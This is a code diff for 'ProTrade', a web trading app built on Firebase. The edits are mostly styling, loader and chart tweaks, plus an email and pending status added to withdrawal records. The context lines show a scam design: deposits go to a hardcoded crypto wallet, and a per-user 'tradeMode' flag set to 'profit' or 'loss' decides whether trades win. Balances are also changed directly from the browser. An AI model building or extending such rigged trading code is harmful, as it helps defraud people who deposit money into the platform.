@@ -38,14 +38,14 @@
 
     <div id="authSection" class="h-full flex items-center justify-center p-4">
         <div class="glass-card w-full max-w-sm p-8 rounded-[32px]">
-            <h1 class="text-3xl font-black text-center mb-8 uppercase italic">ProTrade</h1>
+            <h1 class="text-3xl font-black text-center mb-8 uppercase italic text-yellow-500">ProTrade</h1>
             <div class="flex bg-black/40 p-1.5 rounded-2xl mb-8">
                 <button onclick="switchAuth('login')" id="loginTab" class="flex-1 py-3 text-sm font-bold">Login</button>
                 <button onclick="switchAuth('reg')" id="regTab" class="flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl">Registration</button>
             </div>
             <input type="email" id="userEmail" placeholder="Email" class="auth-input mb-4">
             <input type="password" id="userPass" placeholder="Password" class="auth-input mb-6">
-            <button onclick="handleAuth()" id="authBtn" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Registration</button>
+            <button onclick="handleAuth()" id="authBtn" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Registration</button>
         </div>
     </div>
 
@@ -101,7 +101,7 @@
     </div>
 
     <div id="settingsM" class="modal">
-        <div class="glass-card p-8 rounded-[32px] w-full max-sm text-center">
+        <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <div class="flex justify-between items-center mb-6">
                 <h2 class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Account Details</h2>
                 <button onclick="hideM('settingsM')" class="text-gray-500 text-2xl font-light">&times;</button>
@@ -185,8 +185,12 @@
         function copyWallet() { navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); document.getElementById('copyBtn').innerText="COPIED!"; setTimeout(()=>document.getElementById('copyBtn').innerText="COPY",2000); }
 
         // --- SESSION VERIFICATION FIX ---
+        const hideLoader = () => { document.getElementById('loadingScreen').style.display = 'none'; };
+        
+        // Safety timeout: If firebase doesn't respond in 5s, hide loader
+        setTimeout(hideLoader, 5000);
+
         auth.onAuthStateChanged(user => {
-            const loader = document.getElementById('loadingScreen');
             if(user) {
                 db.collection('users').doc(user.uid).onSnapshot(doc => {
                     userData = doc.data();
@@ -200,18 +204,17 @@
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
                         if(!chartLoaded) { loadChart('FX:EURUSD'); chartLoaded = true; }
-                        loader.style.display = 'none'; // Loader hidden when data loaded
+                        hideLoader();
                     } else {
-                        // In case user exists in auth but not in firestore yet
-                        loader.style.display = 'none';
+                        hideLoader();
                     }
                 }, (error) => {
-                    loader.style.display = 'none';
+                    hideLoader();
                 });
             } else { 
                 document.getElementById('authSection').style.display = 'flex'; 
                 document.getElementById('appTerminal').style.display = 'none'; 
-                loader.style.display = 'none'; // Loader hidden when no user
+                hideLoader();
             }
         });
 
@@ -225,12 +228,15 @@
                     await db.collection('users').doc(r.user.uid).set({ email: e, balance: 0, tradeMode: 'normal' }); 
                 } else { await auth.signInWithEmailAndPassword(e, p); } 
             } catch(err) { 
-                document.getElementById('loadingScreen').style.display = 'none';
+                hideLoader();
                 showError(err.message); 
             }
         }
 
-        function loadChart(s) { new TradingView.widget({ "autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_side_toolbar": true }); }
+        function loadChart(s) { 
+            document.getElementById('tv_chart').innerHTML = "";
+            new TradingView.widget({ "autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_side_toolbar": true, "style": "1" }); 
+        }
         
         function toDStep(s) { 
             document.getElementById('dStep1').classList.add('hidden'); 
@@ -243,6 +249,7 @@
             const name = document.getElementById('depAccName').value;
             const sentAmt = document.getElementById('depSentAmt').value;
             const tx = document.getElementById('depTx').value;
+            const pkrAmt = document.getElementById('depAmtInput').value;
             if(!name || !sentAmt || !tx) return showError("Please fill all fields");
             try {
                 await db.collection('requests').add({ 
@@ -251,7 +258,7 @@
                     accountName: name,
                     sentAmount: sentAmt,
                     txid: tx, 
-                    requestedAmount: document.getElementById('depAmtInput').value,
+                    requestedAmount: pkrAmt,
                     time: Date.now(),
                     status: 'pending'
                 });
@@ -266,7 +273,7 @@
             const amt = parseFloat(document.getElementById('witAmt').value);
             if(!amt || amt > userData.balance) return showError("Invalid amount or low balance.");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
-            await db.collection('withdrawals').add({ uid: auth.currentUser.uid, amount: amt, time: Date.now() });
+            await db.collection('withdrawals').add({ uid: auth.currentUser.uid, amount: amt, email: auth.currentUser.email, time: Date.now(), status: 'pending' });
             hideM('witM'); showSuccess("Processing", "Withdrawal request received.");
         }
 
@@ -288,4 +295,4 @@
             const m = userData.tradeMode || 'normal';
             let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
             const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); box.innerHTML = `<h2 class="text-green-500 font-black">PROF
+            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase
